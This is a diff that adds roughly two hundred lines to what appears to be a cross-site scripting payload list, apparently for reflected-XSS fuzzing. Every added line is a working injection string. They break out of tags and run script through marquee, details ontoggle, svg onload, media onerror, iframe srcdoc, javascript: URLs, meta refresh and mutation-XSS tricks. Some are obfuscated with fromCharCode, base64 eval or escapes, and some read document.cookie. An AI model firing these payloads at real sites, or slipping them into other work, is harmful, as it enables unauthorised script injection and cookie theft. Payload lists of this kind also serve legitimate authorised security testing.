@@ -23,6 +23,206 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 "><script>alert(document.domain)</script>
 "--><script>alert(document.domain)</script>
 </script><script>alert(document.domain)</script>
+">>>>><marquee>RXSS</marquee></head><abc></script><script>alert('Oushexplo')</script><meta
+'>>>>>><marquee>XSS</marquee></title><xyz></script><script>alert(1)</script><meta
+">>>>><marquee>PWNED</marquee></body><def></style><script>alert(document.domain)</script><img
+>>>>>><marquee>HACK</marquee></head><ghi></script><script>confirm(1)</script><link
+">>>>><marquee>INJECT</marquee></html><jkl></script><script>prompt(1)</script><base
+'>>>>>><marquee>RXSS1</marquee></head><abc></script><script>alert('X1')</script><meta
+">>>>><marquee>RXSS2</marquee></title><xyz></style><script>alert('X2')</script><img
+>>>>>><marquee>RXSS3</marquee></body><def></script><script>alert('X3')</script><link
+">>>>><marquee>RXSS4</marquee></html><ghi></style><script>alert('X4')</script><base
+'>>>>>><marquee>RXSS5</marquee></head><jkl></script><script>alert('X5')</script><meta
+">>>>><marquee>RXSS6</marquee></title><abc></style><script>alert('X6')</script><img
+>>>>>><marquee>RXSS7</marquee></body><xyz></script><script>alert('X7')</script><link
+">>>>><marquee>RXSS8</marquee></html><def></style><script>alert('X8')</script><base
+'>>>>>><marquee>RXSS9</marquee></head><ghi></script><script>alert('X9')</script><meta
+">>>>><marquee>RXSS10</marquee></title><jkl></style><script>alert('X10')</script><img
+>>>>>><marquee>RXSS11</marquee></body><abc></script><script>alert('X11')</script><link
+">>>>><marquee>RXSS12</marquee></html><xyz></style><script>alert('X12')</script><base
+'>>>>>><marquee>RXSS13</marquee></head><def></script><script>alert('X13')</script><meta
+">>>>><marquee>RXSS14</marquee></title><ghi></style><script>alert('X14')</script><img
+>>>>>><marquee>RXSS15</marquee></body><jkl></script><script>alert('X15')</script><link
+">>>>><marquee>RXSS16</marquee></html><abc></style><script>alert('X16')</script><base
+'>>>>>><marquee>RXSS17</marquee></head><xyz></script><script>alert('X17')</script><meta
+">>>>><marquee>RXSS18</marquee></title><def></style><script>alert('X18')</script><img
+>>>>>><marquee>RXSS19</marquee></body><ghi></script><script>alert('X19')</script><link
+">>>>><marquee>RXSS20</marquee></html><jkl></style><script>alert('X20')</script><base
+'>>>>>><marquee>RXSS21</marquee></head><abc></script><script>alert('X21')</script><meta
+">>>>><marquee>RXSS22</marquee></title><xyz></style><script>alert('X22')</script><img
+>>>>>><marquee>RXSS23</marquee></body><def></script><script>alert('X23')</script><link
+">>>>><marquee>RXSS24</marquee></html><ghi></style><script>alert('X24')</script><base
+'>>>>>><marquee>RXSS25</marquee></head><jkl></script><script>alert('X25')</script><meta
+">>>>><details open><summary>X</summary>RXSS</details></head><abc></script><script>alert(1)</script><meta
+'>>>>><details open ontoggle=alert(1)>RXSS</details></title><xyz></script><script>alert(2)</script><img
+>>>>>><details><summary>PWN</summary></details></body><def></style><script>alert(3)</script><link
+">>>>><details open><summary>HACKED</summary></details></html><ghi></script><script>alert(4)</script><base
+'>>>>><details open ontoggle=alert(document.cookie)>X</details></head><jkl></script><script>alert(5)</script><meta
+">>>>><details open><summary>S1</summary>D1</details></head><abc></script><script>alert('D1')</script><meta
+'>>>>><details open ontoggle=alert('D2')>D2</details></title><xyz></style><script>alert('D2')</script><img
+>>>>>><details><summary>D3</summary></details></body><def></script><script>alert('D3')</script><link
+">>>>><details open><summary>D4</summary></details></html><ghi></style><script>alert('D4')</script><base
+'>>>>><details open ontoggle=alert('D5')>D5</details></head><jkl></script><script>alert('D5')</script><meta
+">>>>><details open><summary>D6</summary></details></title><abc></style><script>alert('D6')</script><img
+'>>>>><details open ontoggle=alert('D7')>D7</details></body><xyz></script><script>alert('D7')</script><link
+>>>>>><details><summary>D8</summary></details></html><def></style><script>alert('D8')</script><base
+">>>>><details open><summary>D9</summary></details></head><ghi></script><script>alert('D9')</script><meta
+'>>>>><details open ontoggle=alert('D10')>D10</details></title><jkl></style><script>alert('D10')</script><img
+">>>>><details open><summary>D11</summary></details></body><abc></script><script>alert('D11')</script><link
+'>>>>><details open ontoggle=alert('D12')>D12</details></html><xyz></style><script>alert('D12')</script><base
+>>>>>><details><summary>D13</summary></details></head><def></script><script>alert('D13')</script><meta
+">>>>><details open><summary>D14</summary></details></title><ghi></style><script>alert('D14')</script><img
+'>>>>><details open ontoggle=alert('D15')>D15</details></body><jkl></script><script>alert('D15')</script><link
+">>>>><details open><summary>D16</summary></details></html><abc></style><script>alert('D16')</script><base
+'>>>>><details open ontoggle=alert('D17')>D17</details></head><xyz></script><script>alert('D17')</script><meta
+>>>>>><details><summary>D18</summary></details></title><def></style><script>alert('D18')</script><img
+">>>>><details open><summary>D19</summary></details></body><ghi></script><script>alert('D19')</script><link
+'>>>>><details open ontoggle=alert('D20')>D20</details></html><jkl></style><script>alert('D20')</script><base
+">>>>><svg onload=alert(1)>RXSS</svg></head><abc></script><script>alert(2)</script><meta
+'>>>>><svg><script>alert(1)</script></svg></title><xyz></style><script>alert(3)</script><img
+>>>>>><math><mtext>RXSS</mtext></math></body><def></script><script>alert(4)</script><link
+">>>>><svg/onload=alert(1)>X</svg></html><ghi></style><script>alert(5)</script><base
+'>>>>><math href=javascript:alert(1)>X</math></head><jkl></script><script>alert(6)</script><meta
+">>>>><svg onload=alert('S1')>S1</svg></head><abc></script><script>alert('S1')</script><meta
+'>>>>><svg><script>alert('S2')</script></svg></title><xyz></style><script>alert('S2')</script><img
+>>>>>><math><mtext>S3</mtext></math></body><def></script><script>alert('S3')</script><link
+">>>>><svg/onload=alert('S4')>S4</svg></html><ghi></style><script>alert('S4')</script><base
+'>>>>><math href=javascript:alert('S5')>S5</math></head><jkl></script><script>alert('S5')</script><meta
+">>>>><svg onload=alert('S6')>S6</svg></title><abc></style><script>alert('S6')</script><img
+'>>>>><svg><script>alert('S7')</script></svg></body><xyz></script><script>alert('S7')</script><link
+>>>>>><math><mtext>S8</mtext></math></html><def></style><script>alert('S8')</script><base
+">>>>><svg/onload=alert('S9')>S9</svg></head><ghi></script><script>alert('S9')</script><meta
+'>>>>><math href=javascript:alert('S10')>S10</math></title><jkl></style><script>alert('S10')</script><img
+">>>>><svg onload=alert('S11')>S11</svg></body><abc></script><script>alert('S11')</script><link
+'>>>>><svg><script>alert('S12')</script></svg></html><xyz></style><script>alert('S12')</script><base
+>>>>>><math><mtext>S13</mtext></math></head><def></script><script>alert('S13')</script><meta
+">>>>><svg/onload=alert('S14')>S14</svg></title><ghi></style><script>alert('S14')</script><img
+'>>>>><math href=javascript:alert('S15')>S15</math></body><jkl></script><script>alert('S15')</script><link
+">>>>><svg onload=alert('S16')>S16</svg></html><abc></style><script>alert('S16')</script><base
+'>>>>><svg><script>alert('S17')</script></svg></head><xyz></script><script>alert('S17')</script><meta
+>>>>>><math><mtext>S18</mtext></math></title><def></style><script>alert('S18')</script><img
+">>>>><svg/onload=alert('S19')>S19</svg></body><ghi></script><script>alert('S19')</script><link
+'>>>>><math href=javascript:alert('S20')>S20</math></html><jkl></style><script>alert('S20')</script><base
+">>>>><video><source onerror=alert(1)></video></head><abc></script><script>alert(2)</script><meta
+'>>>>><audio src=x onerror=alert(1)></audio></title><xyz></style><script>alert(3)</script><img
+>>>>>><video src=x onerror=alert(1)>RXSS</video></body><def></script><script>alert(4)</script><link
+">>>>><audio><source onerror=alert(1)></audio></html><ghi></style><script>alert(5)</script><base
+'>>>>><video><track onerror=alert(1)></video></head><jkl></script><script>alert(6)</script><meta
+">>>>><video><source onerror=alert('V1')></video></head><abc></script><script>alert('V1')</script><meta
+'>>>>><audio src=x onerror=alert('V2')></audio></title><xyz></style><script>alert('V2')</script><img
+>>>>>><video src=x onerror=alert('V3')>V3</video></body><def></script><script>alert('V3')</script><link
+">>>>><audio><source onerror=alert('V4')></audio></html><ghi></style><script>alert('V4')</script><base
+'>>>>><video><track onerror=alert('V5')></video></head><jkl></script><script>alert('V5')</script><meta
+">>>>><video><source onerror=alert('V6')></video></title><abc></style><script>alert('V6')</script><img
+'>>>>><audio src=x onerror=alert('V7')></audio></body><xyz></script><script>alert('V7')</script><link
+>>>>>><video src=x onerror=alert('V8')>V8</video></html><def></style><script>alert('V8')</script><base
+">>>>><audio><source onerror=alert('V9')></audio></head><ghi></script><script>alert('V9')</script><meta
+'>>>>><video><track onerror=alert('V10')></video></title><jkl></style><script>alert('V10')</script><img
+">>>>><video><source onerror=alert('V11')></video></body><abc></script><script>alert('V11')</script><link
+'>>>>><audio src=x onerror=alert('V12')></audio></html><xyz></style><script>alert('V12')</script><base
+>>>>>><video src=x onerror=alert('V13')>V13</video></head><def></script><script>alert('V13')</script><meta
+">>>>><audio><source onerror=alert('V14')></audio></title><ghi></style><script>alert('V14')</script><img
+'>>>>><video><track onerror=alert('V15')></video></body><jkl></script><script>alert('V15')</script><link
+">>>>><iframe src=javascript:alert(1)></iframe></head><abc></script><script>alert(2)</script><meta
+'>>>>><object data=javascript:alert(1)></object></title><xyz></style><script>alert(3)</script><img
+>>>>>><embed src=javascript:alert(1)></embed></body><def></script><script>alert(4)</script><link
+">>>>><iframe srcdoc="<script>alert(1)</script>"></iframe></html><ghi></style><script>alert(5)</script><base
+'>>>>><object data="data:text/html,<script>alert(1)</script>"></object></head><jkl></script><script>alert(6)</script><meta
+">>>>><iframe src=javascript:alert('I1')></iframe></head><abc></script><script>alert('I1')</script><meta
+'>>>>><object data=javascript:alert('I2')></object></title><xyz></style><script>alert('I2')</script><img
+>>>>>><embed src=javascript:alert('I3')></embed></body><def></script><script>alert('I3')</script><link
+">>>>><iframe srcdoc="<script>alert('I4')</script>"></iframe></html><ghi></style><script>alert('I4')</script><base
+'>>>>><object data="data:text/html,<script>alert('I5')</script>"></object></head><jkl></script><script>alert('I5')</script><meta
+">>>>><iframe src=javascript:alert('I6')></iframe></title><abc></style><script>alert('I6')</script><img
+'>>>>><object data=javascript:alert('I7')></object></body><xyz></script><script>alert('I7')</script><link
+>>>>>><embed src=javascript:alert('I8')></embed></html><def></style><script>alert('I8')</script><base
+">>>>><iframe srcdoc="<script>alert('I9')</script>"></iframe></head><ghi></script><script>alert('I9')</script><meta
+'>>>>><object data="data:text/html,<script>alert('I10')</script>"></object></title><jkl></style><script>alert('I10')</script><img
+">>>>><iframe src=javascript:alert('I11')></iframe></body><abc></script><script>alert('I11')</script><link
+'>>>>><object data=javascript:alert('I12')></object></html><xyz></style><script>alert('I12')</script><base
+>>>>>><embed src=javascript:alert('I13')></embed></head><def></script><script>alert('I13')</script><meta
+">>>>><iframe srcdoc="<script>alert('I14')</script>"></iframe></title><ghi></style><script>alert('I14')</script><img
+'>>>>><object data="data:text/html,<script>alert('I15')</script>"></object></body><jkl></script><script>alert('I15')</script><link
+">>>>><form><button formaction=javascript:alert(1)>X</button></form></head><abc></script><script>alert(2)</script><meta
+'>>>>><input autofocus onfocus=alert(1)></title><xyz></style><script>alert(3)</script><img
+>>>>>><form action=javascript:alert(1)><input type=submit></form></body><def></script><script>alert(4)</script><link
+">>>>><button formaction=javascript:alert(1)>RXSS</button></html><ghi></style><script>alert(5)</script><base
+'>>>>><input onfocus=alert(1) autofocus></head><jkl></script><script>alert(6)</script><meta
+">>>>><form><button formaction=javascript:alert('F1')>F1</button></form></head><abc></script><script>alert('F1')</script><meta
+'>>>>><input autofocus onfocus=alert('F2')></title><xyz></style><script>alert('F2')</script><img
+>>>>>><form action=javascript:alert('F3')><input type=submit></form></body><def></script><script>alert('F3')</script><link
+">>>>><button formaction=javascript:alert('F4')>F4</button></html><ghi></style><script>alert('F4')</script><base
+'>>>>><input onfocus=alert('F5') autofocus></head><jkl></script><script>alert('F5')</script><meta
+">>>>><form><button formaction=javascript:alert('F6')>F6</button></form></title><abc></style><script>alert('F6')</script><img
+'>>>>><input autofocus onfocus=alert('F7')></body><xyz></script><script>alert('F7')</script><link
+>>>>>><form action=javascript:alert('F8')><input type=submit></form></html><def></style><script>alert('F8')</script><base
+">>>>><button formaction=javascript:alert('F9')>F9</button></head><ghi></script><script>alert('F9')</script><meta
+'>>>>><input onfocus=alert('F10') autofocus></title><jkl></style><script>alert('F10')</script><img
+">>>>><body onload=alert(1)></body></head><abc></script><script>alert(2)</script><meta
+'>>>>><meta http-equiv=refresh content=0;url=javascript:alert(1)></title><xyz></style><script>alert(3)</script><img
+>>>>>><base href=javascript:alert(1)//></body><def></script><script>alert(4)</script><link
+">>>>><body onpageshow=alert(1)></body></html><ghi></style><script>alert(5)</script><base
+'>>>>><meta http-equiv=refresh content=0;url=data:text/html,<script>alert(1)</script>></head><jkl></script><script>alert(6)</script><meta
+">>>>><body onload=alert('B1')></body></head><abc></script><script>alert('B1')</script><meta
+'>>>>><meta http-equiv=refresh content=0;url=javascript:alert('B2')></title><xyz></style><script>alert('B2')</script><img
+>>>>>><base href=javascript:alert('B3')//></body><def></script><script>alert('B3')</script><link
+">>>>><body onpageshow=alert('B4')></body></html><ghi></style><script>alert('B4')</script><base
+'>>>>><meta http-equiv=refresh content=0;url=data:text/html,<script>alert('B5')</script>></head><jkl></script><script>alert('B5')</script><meta
+">>>>><body onload=alert('B6')></body></title><abc></style><script>alert('B6')</script><img
+'>>>>><meta http-equiv=refresh content=0;url=javascript:alert('B7')></body><xyz></script><script>alert('B7')</script><link
+>>>>>><base href=javascript:alert('B8')//></html><def></style><script>alert('B8')</script><base
+">>>>><body onpageshow=alert('B9')></body></head><ghi></script><script>alert('B9')</script><meta
+'>>>>><meta http-equiv=refresh content=0;url=data:text/html,<script>alert('B10')</script>></title><jkl></style><script>alert('B10')</script><img
+">>>>><marquee><svg onload=alert(1)></marquee></head><abc></script><script>alert(2)</script><meta
+'>>>>><details open ontoggle=alert(1)><svg onload=alert(2)></details></title><xyz></style><script>alert(3)</script><img
+>>>>>><svg><script>alert(1)</script></svg><marquee>X</marquee></body><def></script><script>alert(2)</script><link
+">>>>><iframe srcdoc="<svg onload=alert(1)>"></iframe><marquee>RXSS</marquee></html><ghi></style><script>alert(2)</script><base
+'>>>>><math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>"></head><jkl></script><script>alert(2)</script><meta
+">>>>><marquee><svg onload=alert('P1')></marquee></head><abc></script><script>alert('P1')</script><meta
+'>>>>><details open ontoggle=alert('P2')><svg onload=alert('P2')></details></title><xyz></style><script>alert('P2')</script><img
+>>>>>><svg><script>alert('P3')</script></svg><marquee>P3</marquee></body><def></script><script>alert('P3')</script><link
+">>>>><iframe srcdoc="<svg onload=alert('P4')>"></iframe><marquee>P4</marquee></html><ghi></style><script>alert('P4')</script><base
+'>>>>><math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert('P5')>"></head><jkl></script><script>alert('P5')</script><meta
+">>>>><marquee><svg onload=alert('P6')></marquee></title><abc></style><script>alert('P6')</script><img
+'>>>>><details open ontoggle=alert('P7')><svg onload=alert('P7')></details></body><xyz></script><script>alert('P7')</script><link
+>>>>>><svg><script>alert('P8')</script></svg><marquee>P8</marquee></html><def></style><script>alert('P8')</script><base
+">>>>><iframe srcdoc="<svg onload=alert('P9')>"></iframe><marquee>P9</marquee></head><ghi></script><script>alert('P9')</script><meta
+'>>>>><math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert('P10')>"></title><jkl></style><script>alert('P10')</script><img
+">>>>><marquee><svg onload=alert('P11')></marquee></body><abc></script><script>alert('P11')</script><link
+'>>>>><details open ontoggle=alert('P12')><svg onload=alert('P12')></details></html><xyz></style><script>alert('P12')</script><base
+>>>>>><svg><script>alert('P13')</script></svg><marquee>P13</marquee></head><def></script><script>alert('P13')</script><meta
+">>>>><iframe srcdoc="<svg onload=alert('P14')>"></iframe><marquee>P14</marquee></title><ghi></style><script>alert('P14')</script><img
+'>>>>><math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert('P15')>"></body><jkl></script><script>alert('P15')</script><link
+">>>>><marquee>RXSS</marquee></head><abc></script><script>alert(String.fromCharCode(88,83,83))</script><meta
+'>>>>><marquee>X</marquee></title><xyz></script><script>eval(atob('YWxlcnQoMSk='))</script><img
+>>>>>><marquee>RXSS</marquee></body><def></style><script>alert(document.cookie)</script><link
+">>>>><marquee>HACK</marquee></head><ghi></script><script>alert&#40;1&#41;</script><base
+'>>>>><marquee>PWN</marquee></html><jkl></script><script>\u0061lert(1)</script><meta
+">>>>><marquee>RXSS</marquee></head><abc></script><script>alert(String.fromCharCode(69,49))</script><meta
+'>>>>><marquee>E2</marquee></title><xyz></script><script>eval(atob('YWxlcnQoMik='))</script><img
+>>>>>><marquee>E3</marquee></body><def></style><script>alert(document.domain)</script><link
+">>>>><marquee>E4</marquee></head><ghi></script><script>alert&#40;4&#41;</script><base
+'>>>>><marquee>E5</marquee></html><jkl></script><script>\u0061lert(5)</script><meta
+">>>>><marquee>E6</marquee></head><abc></script><script>alert(String.fromCharCode(69,54))</script><meta
+'>>>>><marquee>E7</marquee></title><xyz></script><script>eval(atob('YWxlcnQoNyk='))</script><img
+>>>>>><marquee>E8</marquee></body><def></style><script>alert(document.URL)</script><link
+">>>>><marquee>E9</marquee></head><ghi></script><script>alert&#40;9&#41;</script><base
+'>>>>><marquee>E10</marquee></html><jkl></script><script>\u0061lert(10)</script><meta
+">>>>><marquee>E11</marquee></head><abc></script><script>alert(String.fromCharCode(69,49,49))</script><meta
+'>>>>><marquee>E12</marquee></title><xyz></script><script>eval(atob('YWxlcnQoMTIp'))</script><img
+>>>>>><marquee>E13</marquee></body><def></style><script>alert(document.referrer)</script><link
+">>>>><marquee>E14</marquee></head><ghi></script><script>alert&#40;14&#41;</script><base
+'>>>>><marquee>E15</marquee></html><jkl></script><script>\u0061lert(15)</script><meta
+">>>>><marquee>RXSS</marquee><svg onload=alert(1)></head><abc></script><script>alert(2)</script><meta
+'>>>>><details open ontoggle=alert(1)><marquee>X</marquee></title><xyz></style><script>alert(2)</script><img
+>>>>>><svg><script>alert(1)</script></svg><marquee>RXSS</marquee></body><def></script><script>alert(2)</script><link
+">>>>><iframe srcdoc="<marquee>RXSS</marquee><script>alert(1)</script>"></iframe></head><abc></script><script>alert(2)</script><meta
+'>>>>><marquee>RXSS</marquee></head><abc></script><script>alert('Oushexplo')</script><meta http-equiv=refresh content=0;url=javascript:alert(2)>
+">>>>><marquee>OUSH</marquee><details open ontoggle=alert(1)><svg onload=alert(2)></head><abc></script><script>alert(3)</script><meta
+'>>>>><svg onload=alert(1)><marquee>OUSH</marquee></title><xyz></style><script>alert(2)</script><img
+>>>>>><details open ontoggle=alert(1)><svg onload=alert(2)><marquee>OUSH</marquee></body><def></script><script>alert(3)</script><link
+">>>>><iframe srcdoc="<svg onload=alert(1)><marquee>OUSH</marquee>"></iframe></html><ghi></style><script>alert(2)</script><base
+'>>>>><marquee>OUSH</marquee></head><abc></script><script>alert('Oushexplo')</script><meta http-equiv=refresh content=0;url=javascript:alert('XSS')>
 "><script>alert(1)</script>
 "--><script>alert(1)</script>
 %22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
